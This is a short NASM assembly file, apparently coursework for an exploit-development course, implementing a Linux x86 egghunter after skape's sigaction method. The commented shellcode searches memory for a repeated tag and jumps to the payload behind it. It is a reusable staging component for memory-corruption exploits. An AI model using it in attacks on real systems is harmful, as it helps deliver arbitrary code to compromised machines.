; Filename: egghunt.nasm
; Author:  msstavros
; Student-ID: SLAE-645 
;
; Purpose: egghunter shellcode implementation based on skape's sigaction code
; Reference: Skape, nologin

global _start			

section .text
_start:
	cld			;not really needed, but added for robustness. See skape's doc
	or cx, 0xfff
label1:
	inc ecx
	push byte +0x43 	; avoid null bytes
	pop eax
	int 0x80		;sigaction syscall
	cmp al, 0xf2		;was there an EFAULT while accessing the mem region?
	jz _start		;if yes, go to next
	mov eax, 0x53545354	;if not load eax with the pattern we are looking for
	mov edi, ecx		;load contents of memory location to ecx for the scasd
	scasd
	jnz label1		;if there was no match, go to next region
	scasd			;the second scasd will match only if the pattern repeated
	jnz label1		;pattern dit not repeat, go to next region
	jmp edi			;if we are here, both patterns were found, we reached
				;our shellcode
